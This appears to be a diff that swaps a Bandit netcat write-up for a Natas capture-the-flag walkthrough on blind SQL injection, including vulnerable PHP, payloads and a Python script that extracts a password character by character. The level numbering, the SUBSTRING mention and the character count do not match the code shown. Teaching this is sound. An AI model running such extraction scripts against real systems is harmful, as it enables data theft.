@@ -1,84 +1,114 @@
-# OverTheWire Bandit: Level 14 → Level 15
+# Natas Level 14 → Level 15
 
-## Challenge Description
+**Goal:** Find the password for natas16. This level is vulnerable to `blind SQL injection`, the query result isn’t shown directly, but the page’s response (true/false message) leaks enough information to extract data one character at a time.
 
-> The password for the next level can be retrieved by submitting the password of
-> the current level to **port 30000 on localhost**.
+###Step 1: Access the level
 
-**Goal:** Send the current level's password (bandit14's password) to a service
-listening on `localhost:30000`, which replies with the password for the next level.
+http://natas15.natas.labs.overthewire.org
 
-**Connection:**
+Username: natas15
+Password: (from previous level)
 
-   ` ssh bandit14@bandit.labs.overthewire.org -p 2220`
+### Step 2: Read the page
 
-(Log in as `bandit14` using either the password obtained from the previous
-level, or the private key from Level 13 → 14.)
+The page has a form that checks if a given username exists, and simply says “This user exists” or “This user doesn’t exist” no actual data or password is shown directly.
 
-## Concepts Involved
+### Step 3: View the PHP source code
 
-- **Ports and network services**: a program can listen on a TCP port and respond to clients.
-- **`localhost`**: the machine we are currently logged into.
-- **`nc` (netcat)**: a simple tool that opens a TCP connection and lets you send
-  and receive raw data.
-- **Pipes (`|`)**: feed the output of one command into another.
+Go to:
 
-## Solution
+http://natas15.natas.labs.overthewire.org/index-source.html
 
-### Step 1: Get the current level's password
+You’ll see logic like:
 
-Since we are logged in as `bandit14`, we can read the password file directly:
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas15', '<censored>');
+    mysql_select_db('natas15', $link);
 
-    bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
-    <redacted>
-
-### Step 2: Connect to port 30000 with netcat
-```bash
-    bandit14@bandit:~$ nc localhost 30000
-
-The connection stays open and waits for input. Paste the password and press Enter:
-
-    <bandit14 password>
-    Correct!
-    <Natas15_password>
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    $res = mysql_query($query, $link);
+    if ($res) {
+        if (mysql_num_rows($res) > 0) {
+            echo "This user exists.<br>";
+        } else {
+            echo "This user doesn't exist.<br>";
+        }
+    } else {
+        echo "Error in query.<br>";
+    }
+}
+?>
 ```
 
-The service replies with `Correct!` followed by the password for `bandit15`.
+Key points:
 
-### Alternative: One-liner with a pipe
+- Same injection point as Level 14 (unsanitized `username` in the query).
+- But this time, there’s `no direct password output` only a binary “exists” / “doesn’t exist” response.
+- This is a `blind SQLi`: we can’t see data directly, but we can ask yes/no questions and infer the answer from which message appears.
 
-Instead of pasting the password manually, pipe it straight into netcat:
-```bash
+### Step 4: Understand the target
 
-    bandit14@bandit:~$ cat /etc/bandit_pass/bandit14 | nc localhost 30000
-    Correct!
-    <Natas15_password>
-``` 
+The `natas16` password is stored in a `users` table, in a `password` column, for the row where `username='natas16'`. We need to extract it character by character using conditional SQL injection.
 
-### Optional: Check that the port is open
-```bash
+### Step 5: Craft a boolean-based blind SQLi payload
 
-    bandit14@bandit:~$ nc -zv localhost 30000
-    Connection to localhost 30000 port [tcp/*] succeeded!
+General technique: inject a condition that’s true only if a specific character at a specific position matches a guess, using `SUBSTRING()`:
+
+```sql
+" AND password LIKE BINARY "a%
+
+Full payload idea (injected into the username field):
+
+" AND (SELECT password FROM users WHERE username="natas16") LIKE BINARY "a%
 ```
-## Result
 
-    Password for bandit15: <******>
+This asks: “Does natas16’s password start with the character `a`?” If “This user exists” is returned, the guess is correct (or at least matches); if not, try the next character.
 
-## Troubleshooting
+### Step 6: Automate the extraction with a script
 
-|                        Problem                                      |                          Cause / Fix                                |
+Doing this manually (26 letters × up to 32 positions) is tedious, automate it with a Python script:
 
-| Connection hangs with no response                                   | The service is waiting for the password. 
-                                                                        Type or paste it and press Enter.                                   |
-| Service replies `Wrong! Please enter the correct current password.` | Password typed incorrectly (extra space or missing character).
-                                                                        Use the pipe method instead.                                        |
-| `Connection refused`                                                | Check the port number (`30000`) and that you are using `localhost`. |
+```python
+import requests
+import string
 
-## Key Takeaways
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+auth = ("natas15", "<password_from_level14>")
+charset = string.ascii_letters + string.digits
 
-- `nc` (netcat) is a flexible tool for talking to TCP services manually.
-- Piping a file into `nc` avoids copy-paste mistakes.
-- Services can authenticate users by a shared secret sent over a plain TCP
-  connection. This is **not secure**, since the data travels unencrypted
-  (the next level introduces SSL/TLS for this reason).
+found_password = ""
+
+for position in range(1, 33):  # natas passwords are typically 32 chars
+    found_char = None
+    for char in charset:
+        payload = f'" AND (SELECT password FROM users WHERE username="natas16") LIKE BINARY "{found_password}{char}%'
+        r = requests.get(url, auth=auth, params={"username": payload})
+        if "This user exists" in r.text:
+            found_char = char
+            found_password += char
+            print(f"Found so far: {found_password}")
+            break
+    if not found_char:
+        break  # no more characters match, password is complete
+
+print("Final password:", found_password)
+```
+
+### Step 7: Run the script
+
+Execute it (needs the `requests` library: `pip install requests`):
+
+```bash
+python3 extract_password.py
+```
+
+It will print the password being built character by character, ending with the full 32-character password.
+
+### Step 8: Get the password
+Final password: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+*Lesson learned*
+
+Even when an application doesn’t directly display query results or error messages, `any observable difference in behavior` (different page text, response time, HTTP status) based on injected conditions can be exploited to extract data via blind SQL injection just more slowly, character by character. The only real `fix remains` the same: use parameterized queries/prepared statements, never build SQL from raw user input, regardless of how little the application appears to “leak.”
